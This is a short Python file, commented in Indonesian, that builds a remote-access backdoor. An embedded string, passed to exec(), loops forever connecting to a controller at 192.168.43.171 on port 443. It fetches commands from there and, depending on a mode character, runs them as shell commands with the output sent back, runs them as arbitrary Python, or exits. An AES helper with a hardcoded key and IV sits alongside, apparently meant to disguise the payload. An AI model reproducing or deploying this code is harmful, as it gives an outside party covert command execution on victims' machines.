from Crypto.Cipher import AES


import time
import socket
import os
import platform
from threading import Thread
import sys    
#module jangan di encrypt


class crypto:
    def __init__(self):
        key = '6543210987654321'
        iv = '1234567890123456'
        self.key, self.iv = key, iv
        self.aes = AES.new(key, AES.MODE_CBC, iv)
    def decrypt(self, data):
        self.data = data
        hasil1 = self.aes.decrypt(self.data)
        hasil1 = hasil1.rstrip(b'\0')
        hasil1 = hasil1.decode('utf-8')
        return hasil1
    def encrypt(self, data):
        try:
         data = data.encode("utf-8")
        except:
         pass
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        while (True):
         if (len(data)%16)==0:
          break
         data += b'\0'
        return aes.encrypt(data)
text="""
import time
import socket
import subprocess
import platform
from threading import Thread    
class connector:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip, self.port = "192.168.43.171", 443
    def conn(self):
        try:
            self.sock.connect((self.ip, self.port))
            self.sock.send("comm".encode('utf-8'))
            command = self.sock.recv(4096).decode('utf-8')
            self.sock.close()
            commander = command[1:]
            #mode 0 == run shell command
            try:
                if command[0] == "0":
                 try:
                     self.sock1.connect((self.ip, self.port))
                     self.sock1.send(subprocess.check_output(commander, shell=True))
                     self.sock.close()
                     return
                 except:
                     pass
                 #mode 1 kirim informasi
                if command[0] == '1':
                 exec(commander)
                if command[0] == "2":
                    try:

                        self.sock.close()
                        sys.exit(0)
                    except:
                        pass
                    
            except:
                yaudah = 1
            self.sock.close()
        except:
            pass
    
    def run(self):
        self.conn()

                   
while True:        
 connector().run()
 time.sleep(1)
            
        
        
connector().run()
"""


#print(crypto().decrypt(text))
#text1 = exec(crypto().decrypt(text))
exec(text)
